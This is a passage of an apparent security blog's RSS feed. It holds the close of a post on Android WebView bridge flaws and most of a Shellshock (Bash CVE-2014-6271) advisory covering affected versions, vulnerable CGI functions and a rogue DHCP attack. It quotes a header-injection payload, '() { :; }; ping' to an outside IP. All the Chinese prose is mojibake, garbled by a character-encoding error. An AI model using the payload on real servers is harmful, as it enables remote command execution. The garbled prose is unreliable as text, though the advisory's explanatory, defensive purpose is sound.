&lt;p&gt;è«‡åˆ°é€™è£¡å¤§å®¶å¯èƒ½æœƒæœ‰å€‹ç–‘å•ï¼Œå¦‚æœæ‡‰ç”¨ç¨‹å¼ä¸­æ‰€è¼‰å…¥çš„é ç«¯ç¶²é ç¶²å€éƒ½æ˜¯å›ºå®šï¼Œå—é–‹ç™¼è€…æ§åˆ¶çš„ï¼Œæ‡‰è©²å°±æœƒå®‰å…¨æ²’æœ‰é¢¨éšªã€‚é‚„è¨˜å¾—åœ¨ &lt;a href=&quot;http://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development/&quot;&gt;è¢«å¿½ç•¥çš„ SSL è™•ç†&lt;/a&gt; è£¡æåŠéçš„ä¸­é–“äººæ”»æ“Šå—ï¼Ÿå¦‚æœé€£ç·šéç¨‹æ˜¯æ¡ç”¨æ˜æ–‡çš„ HTTP ï¼Œæˆ–æ˜¯åŠ å¯†çš„ HTTPS ä½†æ²’è½å¯¦åšå¥½æ†‘è­‰æª¢æŸ¥ï¼Œå…§å®¹å°±æœ‰æ©Ÿæœƒè¢«æ”»æ“Šè€…ç«Šå–ä¿®æ”¹ï¼Œå†çµåˆä¸Šé¢æåˆ°çš„æ¼æ´ï¼Œå°ä½¿ç”¨è€…å¸¶ä¾†çš„å½±éŸ¿å‰‡å¤§å¤§å¢åŠ ã€‚&lt;/p&gt;

&lt;p&gt;ä¸‹é¢æˆ‘å€‘è£½ä½œäº†ä¸€æ®µçµåˆä¸­é–“äººæ”»æ“Šèˆ‡ addJavascriptInterface æ¼æ´ï¼Œæ¨¡æ“¬ä½¿ç”¨è€…æ‰‹æ©Ÿè¢«å…¥ä¾µçš„å½±ç‰‡ï¼š&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/reKEu-Ajo50&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;å¾å½±ç‰‡çš„æœ€å¾Œå¯ä»¥çœ‹åˆ°ï¼Œæ”»æ“Šè€…å–å¾—å­˜åœ¨æ¼æ´çš„æ‡‰ç”¨ç¨‹å¼æ¬Šé™ï¼Œä¸¦å–å¾—è£¡é¢çš„æ©Ÿæ•è³‡æ–™ã€‚&lt;/p&gt;

&lt;p&gt;è€Œåœ¨ç¹éåŒæºç­–ç•¥å•é¡Œä¸Šï¼Œç„¡è«–æ˜¯é€é null byte æˆ–æ˜¯è¨­å®šå±¬æ€§ä¾†é”åˆ°ï¼Œå…¶å¯¦éƒ½æ˜¯å±¬æ–¼å­˜åœ¨å·²ä¹…çš„æ‰‹æ³•ï¼Œå¤šå¹´å‰åœ¨åˆ¥çš„å¹³å°ã€ç€è¦½å™¨ä¸Šå°±å·²ç¶“ç™¼ç”Ÿéï¼Œé™¤äº†ç·¨å¯«ä¸Šçš„ç–å¿½å¤–ï¼Œç¼ºä¹ä¸€å€‹å®Œæ•´çš„æ¸¬è©¦æµç¨‹å»åšæª¢æŸ¥ç›¸ä¿¡ä¹Ÿæ˜¯å…¶ä¸­ä¸€å€‹åŸå› ã€‚&lt;/p&gt;

&lt;p&gt;Android çš„ç”Ÿæ…‹ç³»çµ±å•é¡Œï¼Œä½¿å¾—å¤§å¤šæ•¸çš„ä½¿ç”¨è€…æ‰‹æ©Ÿæœªèƒ½è·Ÿå¾—ä¸Šç³»çµ±æ›´æ–°çš„æ­¥é©Ÿï¼Œè®“ä»–å€‘å³ä½¿çŸ¥é“è‡ªå·±æ‰€ä½¿ç”¨ç³»çµ±å­˜åœ¨å•é¡Œä¹Ÿæ„›è«èƒ½åŠ©ã€‚&lt;/p&gt;

&lt;p&gt;ä½œç‚ºé–‹ç™¼å•†ï¼Œæ‡‰éœ€è¦åœ¨ç³»çµ±æ”¯æ´åº¦èˆ‡å…¶ç›¸æ‡‰å­˜åœ¨çš„å®‰å…¨é¢¨éšªä¸­å–å¾—å¹³è¡¡ï¼Œä¾†æ±ºå®šæ‡‰ç”¨ç¨‹å¼æ‰€æ”¯æ´çš„æœ€ä½ç‰ˆæœ¬ç‚ºä½•ã€‚æœ€å¾Œä½œç‚ºä¸€å€‹è² è²¬ä»»çš„é–‹ç™¼è€…ï¼Œæ‡‰ç‚ºå·²è¢«å…¬é–‹çš„æ¼æ´åšå¥½æ‡‰å°æªæ–½ï¼Œé¿å…ä½¿ç”¨è€…æš´éœ²åœ¨é¢¨éšªç•¶ä¸­ã€‚&lt;/p&gt;

&lt;h3 id=&quot;åƒè€ƒ&quot;&gt;åƒè€ƒ&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://50.56.33.56/blog/?p=314&quot;&gt;Abusing WebView JavaScript Bridges&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.rafayhackingarticles.net/2014/08/android-browser-same-origin-policy.html&quot;&gt;Android Browser Same Origin Policy Bypass &amp;lt; 4.4 - CVE-2014-6041&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html&quot;&gt;A Tale Of Another SOP Bypass In Android Browser &amp;lt; 4.4&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2014/10/13/android-webview-left-shortcuts-for-hacker/</link>
                <guid>https://devco.re/blog/2014/10/13/android-webview-left-shortcuts-for-hacker</guid>
                <pubDate>Mon, 13 Oct 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Shellshock (Bash CVE-2014-6271) å¨è„…ä»åœ¨æ“´å¤§ä¸­ï¼Œä½†ç„¡éœ€éåº¦ææ…Œ</title>
                <description>&lt;p&gt;è‡ª 9/24 ä»¥ä¾†ï¼Œä¸å°‘è³‡è¨Šåœˆæœ‹å‹æ—¥ä»¥ç¹¼å¤œçš„å¿™ç¢Œï¼Œé€™éƒ½å¤šè™§äº†è—åœ¨ Bash è£¡ 22 å¹´çš„å®‰å…¨æ¼æ´ï¼&lt;a href=&quot;https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29&quot;&gt;Shellshock&lt;/a&gt; (Bash CVE-2014-6271)ã€‚å°æ–¼æƒ¡æ„æ”»æ“Šè€…è€Œè¨€ï¼Œé€™æ˜¯ä»Šå¹´ä¾†ç¬¬äºŒæ³¢æ·˜é‡‘æ½®ï¼Œç›¸è¼ƒæ–¼ä¸Šæ¬¡ &lt;a href=&quot;https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; é§­å®¢å€‘çš„åˆ®åˆ®æ¨‚éŠæˆ²éœ€è¦æ‹¼é‹æ°£ï¼Œé€™æ¬¡çš„ Shellshock åªè¦ä¸€ç™¼ç¾åˆ©ç”¨é»ï¼Œå°±èƒ½é¦¬ä¸Šæ“æœ‰åŸºæœ¬çš„ç³»çµ±æ“ä½œæ¬Šé™ï¼Œä¹Ÿé›£æ€ª &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271&quot;&gt;NVD&lt;/a&gt; çµ¦äºˆ Shellshock æœ€åš´é‡çš„ 10.0 åˆ†å½±éŸ¿ç­‰ç´šã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Shellshock å—å½±éŸ¿çš„ Bash ç‰ˆæœ¬å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Bash 4.3 Patch 25 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 4.2 Patch 48 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 4.1 Patch 12 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 4.0 Patch 39 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 3.2 Patch 52 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 3.1 Patch 18 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 3.0 Patch 17 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 2.0.5b Patch 8 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
  &lt;li&gt;Bash 1.14.7 ï¼ˆå«ï¼‰ä»¥å‰ç‰ˆæœ¬&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€™æ¬¡çš„å•é¡Œå‡ºåœ¨ bash å°ç’°å¢ƒè®Šæ•¸çš„è§£æä¸Šã€‚è‹¥æœ‰è¾¦æ³•åœ¨ç’°å¢ƒè®Šæ•¸ä¸­å¡å…¥æƒ¡æ„çš„ç¨‹å¼ç¢¼ï¼Œä¸¦ä¸”é †åˆ©å°‡é€™äº›ç’°å¢ƒè®Šæ•¸å‚³å…¥ bashï¼Œbash å°±æœƒå› è§£æéŒ¯èª¤è€ŒåŸ·è¡Œæƒ¡æ„æŒ‡ä»¤ã€å’Œè®“æ”»æ“Šè€…èƒ½ç›´æ¥å°ç³»çµ±é€²è¡ŒåŸºæœ¬çš„æ“ä½œã€‚åŸå§‹ç¢¼åŠæ›´é€²éšçš„åŸç†è«‹åƒè€ƒ&lt;a href=&quot;http://blog.erratasec.com/2014/09/the-shockingly-bad-code-of-bash.html&quot;&gt;é€™ç¯‡&lt;/a&gt;ã€‚Shellshock ä¹‹æ‰€ä»¥åš´é‡ï¼Œä¸€ä¾†æ˜¯å› ç‚ºæ”»æ“Šèªæ³•ç›¸ç•¶ç°¡å–®ï¼Œåªéœ€è¦ä¸€è¡ŒæŒ‡ä»¤ï¼Œå°±å¯ä»¥ç›´æ¥å°ç³»çµ±é€²è¡Œæ“ä½œï¼›äºŒä¾†æ˜¯å› ç‚º bash ä½¿ç”¨ç¯„åœæ¥µå»£ï¼Œå¤šæ¬¾ä½œæ¥­ç³»çµ±é è¨­ shell å°±æ˜¯ bashã€‚ å¸¸è¦‹çš„ä½œæ¥­ç³»çµ±èˆ‡å…¶é è¨­ shell æ•´ç†å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;ä½œæ¥­ç³»çµ±&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;é è¨­ shell&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;CentOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fedora&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;RHEL&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Mac OS X&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Android&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;æ—©æœŸæ˜¯ ash, 3.0 é–‹å§‹æ˜¯ mksh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;sh (Lenny, 5.0)&lt;br /&gt;dash (Squeeze, 6.0)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;embedded device&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;å¤§éƒ¨åˆ†ä½¿ç”¨ busybox (ash)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;FreeBSD&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;tcsh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;dash&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;iOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Jailbreak å¾Œæ˜¯ bash&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
æˆ‘å€‘çœ‹åˆ°è¿‘åŠæ•¸çŸ¥åçš„ un*x ç³»çµ±é è¨­ä½¿ç”¨ bashï¼Œå¯ä»¥æ¨æƒ³é€™æ¬¡å½±éŸ¿ç¯„åœæœ‰å¤šå»£ï¼Œå°¤å…¶æ˜¯è¨±å¤šæœå‹™éƒ½æ¶æ§‹åœ¨é€™ä¹‹ä¸Šï¼Œè‹¥é­å—åˆ°æ”»æ“Šï¼Œæå¤±çš„å¯èƒ½æ˜¯ä¼æ¥­çš„æ©Ÿå¯†è³‡æ–™æˆ–å®¢æˆ¶è³‡æ–™ã€‚è‡³æ–¼æ²’æœ‰é è¨­ä½¿ç”¨ bash çš„ä½œæ¥­ç³»çµ±ï¼Œä¹Ÿä¸¦ä¸æ„å‘³è‘—å®Œå…¨æ²’æœ‰é¢¨éšªï¼Œä¾‹å¦‚ Ubuntu åœ¨ DHCP å®¢æˆ¶ç«¯ä½¿ç”¨åˆ° bash ï¼Œå°±ä»ç„¶æœƒæœ‰é¢¨éšªï¼Œä¸‹é¢æ–‡ç« ä¸­ä¹Ÿæœƒæåˆ°é€™æ¨£çš„ç‹€æ³ã€‚å¦å¤–ï¼Œæ—©æœŸæ–°èä¸­å¸¸å‡ºç¾ç‰©è¯ç¶²è¨­å‚™æœƒå—æ­¤æ¼æ´å½±éŸ¿çš„å ±å°ï¼Œç¶“éæˆ‘å€‘å¯¦æ¸¬ï¼Œç‰©è¯ç¶²è¨­å‚™ç‚ºæ±‚ç²¾ç°¡ï¼Œå¤§å¤šä½¿ç”¨ busyboxï¼Œè€Œå…¶ shell ç‚º ashï¼Œæ•…å¤§å¤šæ•¸è¨­å‚™åœ¨é€™æ¬¡ Shellshock å¨è„…ä¸­å½±éŸ¿ä¸å¤§ï¼Œä¸éå„˜ç®¡ç‰©è¯ç¶²è¨­å‚™é€ƒéäº†é€™æ¬¡ Shellshock äº‹ä»¶ï¼Œæœ‰è¨±å¤šè¨­å‚™ä»ç„¶æ˜¯&lt;a href=&quot;http://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/&quot;&gt;èµ¤è£¸è£¸&lt;/a&gt;çš„ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å¸¸è¦‹çš„-shellshock-åˆ©ç”¨æ–¹å¼&quot;&gt;å¸¸è¦‹çš„ Shellshock åˆ©ç”¨æ–¹å¼&lt;/h3&gt;

&lt;p&gt;Shellshock æ¼æ´è¢«å…¬å¸ƒå¾Œï¼Œæƒ¡æ„æ”»æ“Šè€…ç„¡ä¸æƒ³è¦é€éé€™å€‹æ¼æ´å°ä¼ºæœå™¨é€²è¡Œé ç«¯æ”»æ“Šï¼Œä¸€äº›é ç«¯æ”»æ“Šæ¦‚å¿µä¹Ÿé™¸çºŒè¢«è­‰å¯¦ã€‚æœ€æ—©çš„&lt;a href=&quot;http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html&quot;&gt;å…¬é–‹å¤§é‡æƒæ&lt;/a&gt;æ˜¯ç”± Errata Security åœ¨å…¶éƒ¨è½æ ¼å…¬å¸ƒæŠ€è¡“ç´°ç¯€ï¼Œä»–å€‘åœ¨ HTTP è«‹æ±‚è¡¨é ­ä¸­çš„ Cookieã€Hostã€Referer ä¸­æ”¾ç½®æƒ¡æ„èªæ³• &lt;code class=&quot;highlighter-rouge&quot;&gt;() { :; }; ping -c 3 209.126.230.74&lt;/code&gt;ï¼Œä¸¦ä¸”åˆ©ç”¨ masscan å°å…¨ä¸–ç•Œ HTTP ä¼ºæœå™¨ (port 80) é€²è¡Œæƒæã€‚å› ç‚ºä¸€èˆ¬ä¼ºæœå™¨æœƒå°‡ HTTP è¡¨é ­ä¸­ä¹‹å…§å®¹æ”¾å…¥ç’°å¢ƒè®Šæ•¸ä¸­ï¼Œè‹¥ä¼ºæœå™¨é¦–é å…¥å£ç¨‹å¼æœ¬èº«æ˜¯ bash shell script æˆ–è€…å…¶å­ç¨‹åºæœ‰å‘¼å«åˆ° bashï¼Œå°±æœƒå—åˆ°æƒ¡æ„èªæ³•çš„å½±éŸ¿ï¼ŒåŸ·è¡Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;ping -c 3 209.126.230.74&lt;/code&gt; æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;h4 id=&quot;æ”»æ“Šä½¿ç”¨-cgi-çš„ç¶²é ä¼ºæœå™¨&quot;&gt;æ”»æ“Šä½¿ç”¨ CGI çš„ç¶²é ä¼ºæœå™¨&lt;/h4&gt;

&lt;p&gt;åˆ©ç”¨åŒæ¨£çš„é“ç†ï¼Œæƒ¡æ„æ”»æ“Šè€…é–‹å§‹åœ¨ HTTP è¡¨é ­ä¸­ç½®å…¥æƒ¡æ„çš„èªæ³•ï¼Œå¤§é‡å»æƒæç¶²è·¯ä¸Šçš„ CGI ç¶²é ï¼Œå› ç‚ºé€™ç¨®ç¶²é å¸¸å‘¼å«ç³»çµ±æŒ‡ä»¤ï¼Œæ‰€ä»¥æˆåŠŸæ©Ÿç‡éƒ½é —é«˜ï¼Œæ”»æ“ŠæˆåŠŸçš„çµæœå¦‚ä¸‹åœ–ï¼Œå¾é€™å¼µåœ–ä¹Ÿå¯äº†è§£é€™å€‹å¼±é»å¯ä»¥ç°¡å–®åœ°é€éä¸€å€‹åƒæ•¸å°±èƒ½ç›´æ¥è®“ç³»çµ±åŸ·è¡Œä»»æ„æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140930/shellshock_cgi2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140930/shellshock_cgi2.png&quot; alt=&quot;æ”»æ“Šä½¿ç”¨ CGI çš„ç¶²é ä¼ºæœå™¨&quot; title=&quot;æ”»æ“Šä½¿ç”¨ CGI çš„ç¶²é ä¼ºæœå™¨&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;è©³ç´°çš„å¯¦ä½œæµç¨‹è«‹åƒè€ƒä¸‹é¢å½±ç‰‡ï¼š&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/RUsHcZi2hIU&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;æˆ‘å€‘åœ˜éšŠä¹Ÿåœ¨ CGI ç’°å¢ƒä¸‹åŸ·è¡Œå¹¾ç¨®ç¨‹å¼èªè¨€é€²è¡Œæ¸¬è©¦ï¼Œç™¼ç¾ç”¨åˆ°ä»¥ä¸‹ function æ™‚æœƒè®€å–åˆ°ç’°å¢ƒè®Šæ•¸ï¼ˆdate åªæ˜¯ç¯„ä¾‹ï¼Œå¯ä»£æ›ç‚ºå…¶ä»–ç³»çµ±æŒ‡ä»¤ï¼‰ï¼Œå› æ­¤è‹¥ä¼ºæœå™¨åœ¨ CGI ç’°å¢ƒä¸‹ä½¿ç”¨é€™äº› functionï¼Œæœƒç‚ºä¼ºæœå™¨æœ¬èº«å¸¶ä¾†åš´é‡é¢¨éšªã€‚&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Language&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Vulnerable Function&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Perl&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;exec(â€œdate &amp;gt; /dev/nullâ€);&lt;br /&gt;open(SHELLSHOCK, â€œ| date &amp;gt; /dev/nullâ€);&lt;br /&gt;system(â€œdate &amp;gt; /dev/null;â€);&lt;br /&gt;print `date &amp;gt; /dev/null`&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;PHP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;exec(â€˜dateâ€™);&lt;br /&gt;system(â€˜dateâ€™);&lt;br /&gt;mb_send_mail();&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Python&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;os.system(â€˜dateâ€™)&lt;br /&gt;subprocess.call(â€˜dateâ€™, shell=True)&lt;br /&gt;subprocess.Popen(â€˜dateâ€™, shell=True)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ruby&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;`date`&lt;br /&gt;exec â€˜dateâ€™&lt;br /&gt;system â€˜dateâ€™&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;å»ºç½®æƒ¡æ„-dhcp-ä¼ºæœå™¨æ„ŸæŸ“é€£ç·šä½¿ç”¨è€…&quot;&gt;å»ºç½®æƒ¡æ„ DHCP ä¼ºæœå™¨æ„ŸæŸ“é€£ç·šä½¿ç”¨è€…&lt;/h4&gt;

&lt;p&gt;åŒæ™‚ï¼Œæœ‰å¦ä¸€æ‰¹äººç™¼ç¾æŸäº›ä½œæ¥­ç³»çµ±åœ¨é€²è¡Œ DHCP é€£ç·šæ™‚ï¼Œæœƒå°‡ DHCP ä¼ºæœå™¨å‚³å…¥çš„ä¸€äº›è³‡è¨Šå¡å…¥åˆ°ç’°å¢ƒè®Šæ•¸ä¸­ã€‚æ–¼æ˜¯ï¼Œè‹¥å»ºç½®ä¸€å€‹æƒ¡æ„ DHCP ä¼ºæœå™¨ï¼Œå°å…¶é€£ç·šçš„ä½¿ç”¨è€…å°±æœ‰å¾ˆé«˜çš„æ©Ÿæœƒé­å—æ”»æ“Šã€‚æˆ‘å€‘å¯¦éš›åšäº†å¯¦é©—æ”»æ“Šä¸€èˆ¬ä½¿ç”¨è€…ï¼Œåœ¨ä½¿ç”¨è€…å»ºç«‹é€£ç·šçš„ç•¶ä¸‹æ”¾ç½®å¾Œé–€ï¼Œå¯¦é©—éç¨‹å¦‚ä¸‹å½±ç‰‡ï¼š&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/rSj1v8pFVKg&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
æˆ‘å€‘ä¹Ÿåˆ†åˆ¥æ¸¬è©¦äº†åœ¨ä¸åŒä½œæ¥­ç³»çµ±ä¸‹æ˜¯å¦æœƒå—åˆ°æƒ¡æ„ DHCP ä¼ºæœå™¨å½±éŸ¿ï¼ŒåŸºæœ¬ä¸Šï¼Œå¸¸è¦‹çš„ un*x ç³»çµ±é–‹æ©Ÿå¾Œè‡ªå‹•é€£ç·šåŸºæœ¬ä¸Šéƒ½æœƒä¸­æ‹›ã€‚&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;OS&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Version&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Vulnerable&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;CentOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.0&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fedora&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.04.1 LTS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;14.04.1 LTS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Android&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;4.4.4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apple iOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.0.4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;FreeBSD&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.0&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Gentoo&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20140925&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO (å·²ä¿®å¾©)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux Mint&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;17 â€œQianaâ€ Cinnamon&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note2&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux Mint&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian 201403 Cinnamon&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note2:1&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Mac OS X&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.9.5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;openSUSE&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;13.2&lt;/td&gt;
